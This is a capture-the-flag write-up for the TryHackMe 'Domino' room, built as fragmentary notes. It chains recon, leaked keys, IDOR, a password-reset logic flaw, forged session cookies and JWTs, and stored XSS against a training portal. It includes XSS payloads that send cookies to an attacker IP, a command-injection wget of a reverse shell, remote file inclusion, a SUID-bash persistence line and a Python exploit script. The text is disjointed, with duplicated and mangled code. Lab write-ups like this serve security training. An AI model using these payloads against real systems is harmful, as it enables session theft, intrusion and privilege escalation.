| ![Domino](/Assets/Images/domino.png) | <br>Name - Domino<br>Type - Linux [Premium]<br>Difficulty - Medium<br>Platform - TryHackMe<br> |
| :----------------------------------: | :--------------------------------------------------------------------------------------------: |
|              Room Link               |                               https://tryhackme.com/room/domino                                |

📝 **Description:** 

**Info**:

"Chain together vulnerabilities in a cascading attack, where every piece you find knocks over the next."

**Story**:

The NexusCorp Employee Portal appears to be a typical internal application with authentication controls and role-based access in place. However, multiple small weaknesses, ranging from misconfigurations to logic flaws, can be combined to fully compromise the system.

 As an attacker, your objective is to observe how the application behaves, interact with its endpoints, and identify weak trust boundaries. By analysing requests, modifying parameters, and chaining vulnerabilities together, you can progressively escalate your access and move deeper into the system.

_A single misstep can trigger a chain reaction, exploit each weakness in sequence and watch the system fall, one domino at a time._

❓ **Questions**:
1. What is the flag found in the admin user's profile notes?
2. What is the flag displayed on the admin panel after gaining admin access?
3. What is the flag obtained after achieving remote code execution on the server? Flag is stored in `/opt/flag3.txt`
4. What is the flag found in the **devops** user's home directory?
5. What is the root flag?

🎯 **Arsenal**:
- </> **Languages:**  bash,  php,
- 🛠️ **Tools:** Nmap, Gobuster, BurpSuite, Hydra

💡 **Tips**:

Connecting to the Machine -
```shell
echo 'TARGET_IP nexus.corp' | sudo tee -a /etc/hosts
```

# ⚝ Reconnaissance

🔎 **Nmap Scan Results:**

```shell
$ nmap -sCV -p- nexus.corp

Nmap scan report for nexus.corp (TARGET_IP)
Host is up (0.025s latency).
Not shown: 65533 closed tcp ports (conn-refused)

PORT   STATE SERVICE VERSION

22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)

80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-title: NexusCorp Portal

Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.49 seconds

```

**Open Ports:**
- port 22 (ssh) - Authentication Required
- port 80 (Apache HTTP Server)

"http://nexus.corp/" -

![domino1](/Assets/Images/domino1.png)

'Our Team' page reveals - 
```
laura.hayes
michael.chen
sarah.johnson
robert.wilson
emma.taylor
david.brown
james.wright
```

We can login with password as `password` except 'laura.hayes'(restricted). Password reset rule is different for laura.hayes.




Next, I searched for important files and directories in the Web Server and used '/Discovery/Web-Content/big.txt' from [SecLists](https://github.com/danielmiessler/SecLists) as a wordlist.



🔎 **Gubuster Scan Results:**

```shell
$ gobuster dir -u http://nexus.corp/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt -b 404,403 -x txt,js,php
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://nexus.corp/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt
[+] Negative Status codes:   403,404
[+] User Agent:              gobuster/3.6
[+] Extensions:              txt,js,php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/403.php              (Status: 200) [Size: 322]
/admin                (Status: 301) [Size: 316] [--> http://nexus.corp/admin/]
/api                  (Status: 301) [Size: 314] [--> http://nexus.corp/api/]
/auth.php             (Status: 200) [Size: 0]
/backup               (Status: 301) [Size: 317] [--> http://nexus.corp/backup/]
/config.php           (Status: 200) [Size: 0]
/dashboard.php        (Status: 302) [Size: 0] [--> /index.php]
/forgot.php           (Status: 200) [Size: 684]
/index.php            (Status: 200) [Size: 861]
/javascript           (Status: 301) [Size: 321] [--> http://nexus.corp/javascript/]
/logout.php           (Status: 302) [Size: 0] [--> /index.php]
/reset.php            (Status: 200) [Size: 410]
/static               (Status: 301) [Size: 317] [--> http://nexus.corp/static/]
/support              (Status: 301) [Size: 318] [--> http://nexus.corp/support/]
/team.php             (Status: 200) [Size: 3747]
Progress: 81924 / 81928 (100.00%)
===============================================================
Finished
===============================================================

```

Key Observations :

```
/403.php              (Status: 200)
/index.php            (Status: 200)
/auth.php             (Status: 200)
/config.php           (Status: 200)
/dashboard.php        (Status: 302)
/logout.php           (Status: 302)
/forgot.php           (Status: 200)
/reset.php            (Status: 200)
/team.php             (Status: 200)
```

```
/admin
/api
/backup
/javascript
/static/support
```





`/team.php` page (usernames) -
```
laura.hayes
michael.chen
sarah.johnson
robert.wilson
emma.taylor
david.brown
james.wright
```

`/forgot.php`  -

![domino2](/Assets/Images/domino2.png)


"http://nexus.corp/api/users/profile.php?id=1" - 

![domino3](/Assets/Images/domino3.png)

admin - 'laura.hayes'

"http://dominov.13.thm/backup/README.txt" - 
```
NexusCorp Backup Configuration
================================
config.enc  - Encrypted application configuration (AES-128-ECB)
Decryption key reference: see static/app.js (deployment notes)
```

"http://dominov.13.thm/static/app.js" -
```js
// NexusCorp Portal - Frontend Utilities
// v2.3.1 - Build 20241115

(function() {
    'use strict';

    // Configuration (TODO: move to env before prod deployment - laura 2024-10-22)
    const CONFIG = {
        apiBase: '/api',
        // Encryption key for backup config decryption - AES-ECB-128
        // Key: N3xusK3y2024!!  (pad to 16 bytes with �)
        _backupKey: 'N3xusK3y2024!!',
        appVersion: '2.3.1'
    };

    // Session helper
    window.NexusApp = {
        getSession: function() {
            const cookie = document.cookie.split(';').find(c => c.trim().startsWith('nexus_session='));
            if (!cookie) return null;
            try {
                return JSON.parse(atob(cookie.split('=')[1].trim()));
            } catch(e) { return null; }
        },
        getApiToken: function() {
            return localStorage.getItem('nexus_jwt');
        },
        setApiToken: function(token) {
            localStorage.setItem('nexus_jwt', token);
        }
    };

    // Auto-fetch JWT if not cached
    if (!localStorage.getItem('nexus_jwt') && document.cookie.includes('nexus_session')) {
        fetch('/api/auth/token.php', {credentials: 'include'})
            .then(r => r.json())
            .then(d => { if (d.token) localStorage.setItem('nexus_jwt', d.token); })
            .catch(() => {});
    }
})();
```

http://nexus.corp/api/auth/token.php - 
```json
{
  "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJlbW1hLnRheWxvciIsInJvbGUiOiJ1c2VyIiwiaWF0IjoxNzc5NDYyNjYyLCJleHAiOjE3Nzk0NjYyNjJ9.YvmEJEVfIDR2Wr/vGL1wY56oGwcM8sr68nFpjxotbRU",
  "expires_in": 3600,
  "note": "Use this token as: Authorization: Bearer <token> for /api/files.php"
}
```

```php
<?php\nrequire_once __DIR__ . '/auth.php';\n$token = $_GET['token'] ?? '';\n$msg = '';\n$error = '';\n$valid_token = null;\nif ($token) {\n $db = get_db();\n $stmt = $db->prepare('SELECT * FROM reset_tokens WHERE token = ? AND used = 0 AND created_at > NOW() - INTERVAL 1 HOUR');\n $stmt->execute([$token]);\n $valid_token = $stmt->fetch(PDO::FETCH_ASSOC);\n if (!$valid_token) $error = 'Invalid or expired token.';\n}\nif ($valid_token && $_SERVER['REQUEST_METHOD'] === 'POST') {\n $new_pass = $_POST['password'] ?? '';\n $target_user = trim($_POST['username'] ?? '');\n if (strlen($new_pass) >= 8 && $target_user) {\n $db = get_db();\n // Logic flaw: token is valid for ANY username, not just the one who requested it\n $stmt = $db->prepare('SELECT id FROM users WHERE username = ? AND role != "admin"');\n $stmt->execute([$target_user]);\n $target = $stmt->fetch(PDO::FETCH_ASSOC);\n if ($target) {\n $hash = password_hash($new_pass, PASSWORD_BCRYPT);\n $db->prepare('UPDATE users SET password_hash = ? WHERE id = ?')->execute([$hash, $target['id']]);\n $db->prepare('UPDATE reset_tokens SET used = 1 WHERE token = ?')->execute([$token]);\n $msg = 'Password updated successfully.';\n } else {\n $error = 'User not found or cannot reset admin accounts.';\n }\n } else {\n $error = 'Password must be at least 8 characters.';\n }\n}\n?>\n\n`
```


reset.php -
```php
<? php
require_once__DIR__ . '/auth.php';
$token = $_GET['token'] ? ? '';
$msg = '';
$error = '';
$valid_token = null;
if($token)
{
    $db = get_db();
    $stmt = $db->prepare('SELECT * FROM reset_tokens WHERE token = ? AND used = 0 AND created_at > NOW() - INTERVAL 1 HOUR');
    $stmt->execute([$token]);
    $valid_token = $stmt->fetch(PDO::FETCH_ASSOC);
    
    if (!$valid_token) $error = 'Invalid or expired token.';
    
}
if($valid_token && $_SERVER['REQUEST_METHOD'] === 'POST')
{
    $new_pass = $_POST['password'] ? ? '';
    $target_user = trim($_POST['username'] ? ? '');
    if (strlen($new_pass) >= 8 && $target_user)
    {
        $db = get_db();
        // Logic flaw: token is valid for ANY username, not just the one who requested it
        $stmt = $db->prepare('SELECT id FROM users WHERE username = ? AND role != "admin"');
        $stmt->execute([$target_user]);
        $target = $stmt->fetch(PDO::FETCH_ASSOC);
        if ($target) {
	        $hash = password_hash($new_pass, PASSWORD_BCRYPT);
	        $db->prepare('UPDATE users SET password_hash = ? WHERE id = ?')->execute([$hash, $target['id']]);
	        $db->prepare('UPDATE reset_tokens SET used = 1 WHERE token = ?')->execute([$token]);
	        $msg = 'Password updated successfully.';
	    } else {
		$error = 'User not found or cannot reset admin accounts.';
		}
		} else {
		$error = 'Password must be at least 8 characters.';
		}
		}
?>
```

```html
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <title>Reset Password - NexusCorp</title>
    <link rel="stylesheet" href="/static/style.css">
</head>

<body class="login-page">
    <div class="login-box">
        <div class="logo"><span class="logo-icon">&#9650;</span> NexusCorp</div>
        <h2>Set New Password</h2>
        <?php if ($error): ?>
        <div class="alert alert-danger">
	        <?= htmlspecialchars($error) ?>
        </div>
        <?php endif; ?>
        <?php if ($msg): ?>
        <div class="alert alert-success">
            <?= $msg ?> <a href="/index.php">Login</a>
        </div>
        <?php endif; ?>
        <?php if ($valid_token && !$msg): ?>
        <form method="POST" action="/reset.php?token=<?= htmlspecialchars($token) ?>">
        <div class="form-group">
	        <label>Username to reset</label>
	        <input type="text" name="username" placeholder="firstname.lastname" required>
	    </div>
		<div class="form-group">
			<label>New Password</label>
			<input type="password" name="password" placeholder="Min 8 characters" required>
		</div>
		<button type="submit" class="btn-primary">Reset Password</button>
		
		</form>
        <?php endif; ?>
        <div class="links"><a href="/index.php">Back to login</a></div>
        </div>\n</body>\n

</html>
```


dashboard
```
eyJ1c2VyX2lkIjo0LCJ1c2VybmFtZSI6InJvYmVydC53aWxzb24iLCJyb2xlIjoidXNlciJ9.06633788837d4525fc57614def8718cf061a8374b95120eb93aedfd74eb4cee3
```

/auth/token.php
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJyb2JlcnQud2lsc29uIiwicm9sZSI6InVzZXIiLCJpYXQiOjE3Nzk1MjY3MzgsImV4cCI6MTc3OTUzMDMzOH0.s2TBAEK0gT/ZCEj3uWh1toOqc8USctsDUrPx7+AHaS8
```

```
url2 = "http://nexus.corp/api/users/profile.php?id=1"
res2 = requests.post(url2, data=data, allow_redirects=True, cookies=cookies)
print(res2.text)
```

```
{"id":1,"username":"laura.hayes","email":"laura.hayes@nexus.corp","role":"admin","notes":"THM{1d0r_h0r1z0nt4l_4cc3ss_fl4g1}"}
```

config.php
```php
<? php

define('DB_HOST', 'localhost');
define('DB_NAME', 'nexusdb');
define('DB_USER', 'app_user');
define('DB_PASS', 'D3v0ps!2024');
define('JWT_SECRET', 'nexus_jwt_s3cr3t_2024');
define('APP_SECRET', 'nexus_app_k3y_2024');
function get_db(){
    $pdo = new PDO('mysql:host=' . DB_HOST . ';dbname=' . DB_NAME, DB_USER, DB_PASS);
    $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
    return $pdo;
}
?>
```

config.txt after decrypt - 
```
{"app_name":"NexusCorp Portal","version":"2.3.1","deploy_env":"production","system_user":"devops"}
```

`/admin/index.php`
```php
<?php
require_once __DIR__ . '/../auth.php';

// Admin panel requires valid admin cookie OR valid admin JWT
$user = get_session();
$jwt_user = null;

if (isset($_SERVER['HTTP_AUTHORIZATION'])) {
    $auth = $_SERVER['HTTP_AUTHORIZATION'];
    if (strpos($auth, 'Bearer ') === 0) {
        $token = substr($auth, 7);
        $jwt_user = verify_jwt($token);
    }
}

// Must have either admin cookie session OR JWT with role=admin
if (!$user || $user['role'] !== 'admin') {
    if (!$jwt_user || ($jwt_user['role'] ?? '') !== 'admin') {
        http_response_code(403);
        include __DIR__ . '/../403.php';
        exit;
    }
    // JWT admin access - set display name
    $display = $jwt_user['sub'];
} else {
    $display = $user['username'];
}

// FLAG 2 is stored here
$flag2 = 'THM{bl1nd_x55_s3ss10n_h1j4ck_fl4g2}';
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Admin Panel - NexusCorp</title>
    <link rel="stylesheet" href="/static/style.css">
</head>
<body>
    <nav class="navbar">
        <div class="nav-brand">
            <span class="logo-icon">▲</span> NexusCorp Admin
        </div>
        <div class="nav-links">
            <a href="/dashboard.php">Portal</a>
            <a href="/logout.php">Logout</a>
        </div>
    </nav>
    <div class="container">
        <div class="admin-header">
            <h1>Administration Console</h1>
            <p>Logged in as: <strong><?= htmlspecialchars($display) ?></strong></p>
        </div>
        <div class="flag-box">
            <h3>System Status</h3>
            <p>Internal reference: <code><?= $flag2 ?></code></p>
        </div>
    </div>
</body>
</html>
```

`/support/create.php`
```php
<? php\
require_once__DIR__ . '\/..\/auth.php';
$user = require_login();
$msg = '';
$error = '';
if($_SERVER['REQUEST_METHOD'] === 'POST')
{
    $subject = trim($_POST['subject'] ? ? '');
    $message = trim($_POST['message'] ? ? '');
    if ($subject && $message)
    {
        $db = get_db();
        // Messagestoredraw - noXSSfiltering(intentionalvulnerability)
        $stmt = $db->prepare('INSERT INTO tickets (user_id, subject, message) VALUES (?, ?, ?)');
        $stmt->execute([$user['id'], $subject, $message]);
        $msg = 'Ticket submitted successfully. An admin will review it shortly.';
    }
    else
    {
        $error = 'Subject and message are required.';
    }
}
?>

```

eyJ1c2VyX2lkIjozLCJ1c2VybmFtZSI6InNhcmFoLmpvaG5zb24iLCJyb2xlIjoidXNlciJ9.0bceab2ebd4da65aefd97d6b1c7a2f3a8fa71d6ee3882cc44b8d97937a5fc49d

eyJ1c2VyX2lkIjoxLCJ1c2VybmFtZSI6ImxhdXJhLmhheWVzIiwicm9sZSI6ImFkbWluIn0=.0bceab2ebd4da65aefd97d6b1c7a2f3a8fa71d6ee3882cc44b8d97937a5fc49d

cookie-format  form `/auth.php`
```
Cookie format: base64(json).hmac_sha256(base64(json), APP_SECRET)
```

eyJ1c2VyX2lkIjoxLCJ1c2VybmFtZSI6ImxhdXJhLmhheWVzIiwicm9sZSI6ImFkbWluIn0=.179723f1fbd3331a8f6cc790ebd2adfbff9fda87f2d4e4190ee0169eaf811025

Query - 
```php
<p>Pending tickets requiring admin review.</p>

<?php
$db = get_db();
$count = $db->query('SELECT COUNT(*) FROM tickets WHERE viewed = 0')
    ->fetchColumn();
echo "<p><strong>$count</strong> unread tickets</p>";
?>
```

'/api/users/profile.php' - 
```php
<?php
require_once __DIR__ . '/../../auth.php';
header('Content-Type: application/json');
$user = require_login();
$id = intval($_GET['id'] ?? 0);
if (!$id) { http_response_code(400);
	echo json_encode(['error'=>'Missing id']);
	exit;
	}
	// IDOR: no ownership check - any logged-in user can view any profile
	$db = get_db();
	$stmt = $db->prepare('SELECT id, username, email, role, notes FROM users WHERE id = ?');
	$stmt->execute([$id]);
	$profile = $stmt->fetch(PDO::FETCH_ASSOC);
	if (!$profile) { http_response_code(404); echo json_encode(['error'=>'User not found']); exit; }
	echo json_encode($profile);
?>
```


```
<script>fetch('http://192.168.232.30:9001/test?href=' + document.referrer);</script>
```

```
<script>fetch('/api/files.php?name=;wget http://192.168.232.30:9001/revshell.php -O /var/www/html/shell.php');</script>
```


```
<script>fetch('http://192.168.232.30:9001/test?c=' + btoa(location.pathname ));</script>
```

```
<script>fetch('http://192.168.232.30:9001');</script>
```

```
<script>fetch('http://192.168.232.30:9001/?' + btoa(document.cookie));</script>
```


RFI to RCE:
```
THM{rf1_2_rc3_f00th0ld_fl4g3}
```

sed -i '7i\os.system("cp /bin/bash /tmp/bash && chmod u+s /tmp/bash && chm
od +x /tmp/bash")' admin_bot.py




Custom Script:
```python
import requests
import json
import jwt
import base64
import hmac
import hashlib

s = requests.Session()

login_url = "http://nexus.corp/index.php"
data = {"username": "sarah.johnson", "password": "password"}

r = s.post(login_url, data=data)

# print(r.text)
cookies = (dict(s.cookies))
# print(cookies)


bearer_url = "http://nexus.corp/api/auth/token.php"
r = s.post(bearer_url, data=data)
json_data = r.json()
token = (json_data['token'])
# print(token)

admin_token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImxhdXJhLmhheWVzIiwicm9sZSI6ImFkbWluIn0.hVMqs9uQc2kUHrw07qT_cWLc1vEHfGEynApoZ7NYv0c"

# admin_token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJzYXJhaC5qb2huc29uIiwicm9sZSI6InVzZXIiLCJpYXQiOjE3Nzk1NDkwOTMsImV4cCI6MTc3OTU1MjY5M30.XninlAlzCr/PbIMIccqZXdCBKkqRiOKPcOPozUJBGfw"

# data = {"username": "sarah.johnson"}
# reset_url = "http://nexus.corp/api/reset.php"
# r = s.post(reset_url, json=data)
# print(r.text)

# json_data = r.json()
# token = (json_data['token'])
# print(token)

file_url = "http://nexus.corp/api/files.php?name=http://192.168.232.30:9001/revshell.php"
headers = {
    "Authorization": f"Bearer {admin_token}"
}
r = s.post(file_url, headers=headers)
print(r.text)


# reset_url = "http://nexus.corp/reset.php?token=" + token
# data = {"username": "laura.hayes", "password": "newpassword"}
# r = s.post(reset_url, data=data)
# print(r.text)

# print(json.dumps(r.json(), indent=2))
# print(r.text)

# payload = {"username": "laura.hayes", "role": "admin"}
# token = jwt.encode(payload, 'nexus_jwt_s3cr3t_2024', algorithm='HS256')
# print(token)

# admin_page = "http://nexus.corp/dashboard.php"
# headers = {
#     "Authorization": f"Bearer {admin_token}"
# }
# r = s.post(admin_page, headers=headers)

# print(r.text)

cookies = (dict(s.cookies)['nexus_session'])
# print(cookies)

APP_SECRET = "nexus_app_k3y_2024"
payload = '{"user_id":1,"username":"laura.hayes","role":"admin"}'

#enc = base64(json).hmac_sha256(base64(json), APP_SECRET)
output = base64.b64encode(payload.encode()).decode()
# print(output)


signature = hmac.new(
    APP_SECRET.encode(),
    output.encode(),
    hashlib.sha256
).hexdigest()

# print(signature)

new_cookie = output + '.' + signature
# print(new_cookie)


```